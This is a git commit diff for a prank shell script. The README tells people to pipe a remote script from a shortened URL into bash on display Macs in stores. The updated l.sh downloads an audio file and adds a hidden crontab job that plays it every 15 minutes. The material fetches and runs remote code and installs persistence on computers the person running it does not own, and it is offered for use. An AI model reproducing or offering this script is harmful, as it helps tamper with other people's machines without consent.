eb4b2156ec7515e890467e73415466c177f74916
Chuck <chuck@agenciaroja.com>
2012-02-17 12:06:13 -0600

    new url

--- README.md
+++ README.md
@@ -3,6 +3,6 @@ Installation
 
 Run this command on any (mac) terminal, like the ones in display in Mac Stores, Liverpool or Sears
 
-`bash <(curl -s url)`
+`bash <(curl -sL http://git.io/5s1yLw)`
 
 Have fun :)
--- l.sh
+++ l.sh
@@ -4,7 +4,7 @@
 curl -s http://0.s3.envato.com/files/17833436/preview.mp3 > ~/.laughs.mp3
 
 # New cron job every 15 minutes
-cmd="0,15,30,45 * * * * afplay ~/.laughs.mp3";
+cmd="0,15,30,45 * * * * afplay ~/.laughs.mp3 # u mad bro?";
 
 # Adding the new job
 (crontab -l; echo "$cmd") | crontab -
